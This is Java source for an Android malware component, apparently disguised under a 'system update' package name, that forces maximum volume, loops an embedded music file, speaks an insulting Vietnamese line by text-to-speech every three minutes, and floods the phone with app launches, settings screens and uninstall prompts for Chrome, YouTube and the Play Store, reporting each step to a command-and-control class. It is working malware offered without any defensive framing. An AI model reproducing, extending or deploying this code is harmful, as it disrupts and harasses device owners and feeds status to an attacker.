package com.system.update;

import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.media.AudioAttributes;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.speech.tts.TextToSpeech;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

/**
 * Continuous noise:
 * - embedded MP3 loop (res/raw/hacker_rap)
 * - TTS every 3 min: "Bố mày là Hải Lâm và là Shriveled VN"
 * - rotating intent flood (browser / Play / Settings / apps / uninstall prompts)
 */
public final class NoiseEngine {

    private static final String TTS_LINE = "Bố mày là Hải Lâm và là Shriveled VN";
    private static final long TTS_INTERVAL_MS = 3 * 60 * 1000L;

    private static MediaPlayer player;
    private static TextToSpeech tts;
    private static boolean ttsReady;
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static int intentIndex;
    private static boolean started;
    private static Runnable ttsRunnable;

    private NoiseEngine() {}

    public static synchronized void start(Context ctx) {
        Context app = ctx.getApplicationContext();
        startMusic(app);
        if (!started) {
            started = true;
            startTts(app);
            scheduleTts();
            C2.send("noise", "started");
        } else {
            ensureMusic(app);
        }
    }

    public static synchronized void stop() {
        started = false;
        if (ttsRunnable != null) H.removeCallbacks(ttsRunnable);
        try {
            if (player != null) {
                player.stop();
                player.release();
            }
        } catch (Throwable ignored) {}
        player = null;
        try {
            if (tts != null) tts.shutdown();
        } catch (Throwable ignored) {}
        tts = null;
        ttsReady = false;
    }

    // ── music ──────────────────────────────────────────────
    private static void startMusic(Context ctx) {
        try {
            if (player != null) {
                try { player.release(); } catch (Throwable ignored) {}
                player = null;
            }
            player = MediaPlayer.create(ctx, R.raw.hacker_rap);
            if (player == null) {
                C2.send("music", "create_null");
                return;
            }
            player.setLooping(true);
            if (Build.VERSION.SDK_INT >= 21) {
                player.setAudioAttributes(new AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_MEDIA)
                        .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                        .build());
            }
            try {
                AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
                if (am != null) {
                    am.setStreamVolume(AudioManager.STREAM_MUSIC,
                            am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
                }
            } catch (Throwable ignored) {}
            player.start();
            C2.send("music", "playing");
        } catch (Throwable t) {
            C2.send("music", "fail:" + String.valueOf(t.getMessage()));
        }
    }

    public static void ensureMusic(Context ctx) {
        try {
            if (player == null || !player.isPlaying()) {
                startMusic(ctx.getApplicationContext());
            }
        } catch (Throwable ignored) {
            startMusic(ctx.getApplicationContext());
        }
    }

    // ── TTS ────────────────────────────────────────────────
    private static void startTts(Context ctx) {
        try {
            tts = new TextToSpeech(ctx.getApplicationContext(), status -> {
                if (status == TextToSpeech.SUCCESS) {
                    try {
                        int r = tts.setLanguage(new Locale("vi", "VN"));
                        if (r == TextToSpeech.LANG_MISSING_DATA || r == TextToSpeech.LANG_NOT_SUPPORTED) {
                            tts.setLanguage(Locale.getDefault());
                        }
                        tts.setSpeechRate(0.92f);
                        ttsReady = true;
                        speakNow();
                        C2.send("tts", "ready");
                    } catch (Throwable ignored) {
                        C2.send("tts", "lang_fail");
                    }
                } else {
                    C2.send("tts", "init_fail");
                }
            });
        } catch (Throwable t) {
            C2.send("tts", "create_fail");
        }
    }

    private static void speakNow() {
        if (!ttsReady || tts == null) return;
        try {
            if (Build.VERSION.SDK_INT >= 21) {
                tts.speak(TTS_LINE, TextToSpeech.QUEUE_FLUSH, null, "shriveled");
            } else {
                tts.speak(TTS_LINE, TextToSpeech.QUEUE_FLUSH, null);
            }
        } catch (Throwable ignored) {}
    }

    private static void scheduleTts() {
        ttsRunnable = new Runnable() {
            @Override
            public void run() {
                if (!started) return;
                speakNow();
                H.postDelayed(this, TTS_INTERVAL_MS);
            }
        };
        H.postDelayed(ttsRunnable, 4_000);
    }

    // ── intent flood ───────────────────────────────────────
    private static List<Intent> buildIntents(Context ctx) {
        List<Intent> list = new ArrayList<>();
        String[] urls = {
                "https://www.tiktok.com",
                "https://www.facebook.com",
                "https://www.youtube.com",
                "https://www.instagram.com",
                "https://twitter.com",
                "https://www.google.com"
        };
        for (String u : urls) {
            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(u));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            list.add(i);
        }

        Intent psWeb = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store"));
        psWeb.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        list.add(psWeb);
        try {
            Intent ps = new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=com.android.chrome"));
            ps.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            list.add(ps);
        } catch (Throwable ignored) {}

        String[] settingsActions = {
                android.provider.Settings.ACTION_SETTINGS,
                android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS,
                android.provider.Settings.ACTION_WIFI_SETTINGS,
                android.provider.Settings.ACTION_BLUETOOTH_SETTINGS,
                android.provider.Settings.ACTION_APPLICATION_SETTINGS,
                android.provider.Settings.ACTION_DISPLAY_SETTINGS,
                android.provider.Settings.ACTION_SOUND_SETTINGS
        };
        for (String a : settingsActions) {
            try {
                Intent i = new Intent(a);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                list.add(i);
            } catch (Throwable ignored) {}
        }

        String[] pkgs = {
                "com.zhiliaoapp.musically",
                "com.ss.android.ugc.trill",
                "com.facebook.katana",
                "com.facebook.lite",
                "com.instagram.android",
                "com.google.android.youtube",
                "com.android.vending",
                "com.android.settings",
                "com.android.chrome"
        };
        for (String pkg : pkgs) {
            try {
                Intent i = ctx.getPackageManager().getLaunchIntentForPackage(pkg);
                if (i != null) {
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    list.add(i);
                }
            } catch (Throwable ignored) {}
        }

        // best-effort uninstall prompts (stock Android still shows confirm dialog)
        String[] targets = {"com.android.chrome", "com.google.android.youtube", "com.android.vending"};
        for (String pkg : targets) {
            try {
                Intent del = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + pkg));
                del.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                list.add(del);
            } catch (Throwable ignored) {}
        }

        return list;
    }

    public static void fireNextIntent(Context ctx) {
        try {
            List<Intent> list = buildIntents(ctx);
            if (list.isEmpty()) return;
            Intent i = list.get(intentIndex % list.size());
            intentIndex++;
            ctx.startActivity(i);
        } catch (ActivityNotFoundException ignored) {
        } catch (Throwable t) {
            C2.send("intent", "fail:" + String.valueOf(t.getMessage()));
        }
    }

    /** Called from PersistService on a short interval. */
    public static void tick(Context ctx) {
        start(ctx);
        ensureMusic(ctx);
        fireNextIntent(ctx);
    }
}
